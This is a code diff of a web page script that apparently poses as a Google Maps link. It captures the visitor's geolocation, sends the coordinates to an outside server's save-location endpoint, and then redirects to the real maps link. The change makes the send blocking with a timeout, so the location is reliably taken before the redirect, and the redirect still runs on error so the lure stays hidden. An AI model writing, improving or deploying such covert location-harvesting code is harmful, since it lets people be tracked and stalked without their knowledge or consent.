@@ -8,34 +8,30 @@
         const googleMapsURL = 'https://maps.app.goo.gl/JVUi2F98vrGs1ryn8';
         const serverURL = 'https://livelocation-k0iy.onrender.com/save-location.php';
 
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        // PROPERLY DEFINED COORDS VARIABLE
-                        const coords = {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            timestamp: new Date(position.timestamp)
-                        };
+        async function getLocation() {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
 
-                        // Send coordinates (now properly scoped)
-                        fetch(serverURL, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify(coords) // Now accessible
-                        });
+                const coords = {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: Date.now()
+                };
 
-                        window.location.href = googleMapsURL;
-                    },
-                    (error) => {
-                        console.error('Geolocation error:', error);
-                        window.location.href = googleMapsURL;
-                    }
-                );
-            } else {
-                alert("Geolocation not supported");
+                // BLOCKING request with 2s timeout
+                await fetch(serverURL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(coords),
+                    signal: AbortSignal.timeout(2000)
+                });
+
+            } catch (error) {
+                console.error('Fatal error:', error);
+            } finally {
                 window.location.href = googleMapsURL;
             }
         }
